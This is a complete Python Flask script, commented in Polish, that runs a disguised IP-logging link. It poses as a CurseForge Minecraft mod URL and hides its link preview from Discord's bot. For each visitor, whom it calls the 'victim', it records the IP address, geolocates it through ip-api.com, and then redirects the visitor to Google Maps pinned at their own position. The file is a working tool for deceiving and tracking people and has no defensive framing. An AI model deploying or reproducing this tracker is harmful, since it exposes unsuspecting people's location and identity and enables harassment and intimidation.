from flask import Flask, request, redirect
import requests
import sys

app = Flask(__name__)

# --- KONFIGURACJA ---
# Link do Google Maps, który ofiara zobaczy na końcu
MAPS_BASE_URL = "https://www.google.com/maps?q="

@app.route('/www.curseforge.com/minecraft/mc-mods/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. UKRYWANIE PODGLĄDU NA DISCORDZIE
    # Jeśli to bot Discorda, zwracamy pustą odpowiedź bez Meta Tagów,
    # co sprawi, że pod linkiem nie pokaże się zupełnie nic.
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return "", 204 # "No Content" - bot nic nie wygeneruje

    # 2. LOGOWANIE DANYCH W KONSOLI RENDERA
    print(f"\n[!!!] OFIARA WESZŁA W LINK [!!!]", flush=True)
    print(f"IP: {ip}", flush=True)
    
    target_url = "https://www.google.com/maps" # Domyślnie sama mapa
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            lat = r.get('lat')
            lon = r.get('lon')
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"WSPÓŁRZĘDNE: {lat}, {lon}", flush=True)
            # Tworzymy link do Google Maps z pinezką w miejscu ofiary
            target_url = f"{MAPS_BASE_URL}{lat},{lon}"
    except Exception as e:
        print(f"Błąd lokalizacji: {e}", flush=True)
    
    sys.stdout.flush()

    # 3. PRZEKIEROWANIE OFIARY DO GOOGLE MAPS
    # Ofiara po kliknięciu od razu ląduje na mapie ze swoją lokalizacją.
    return redirect(target_url)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
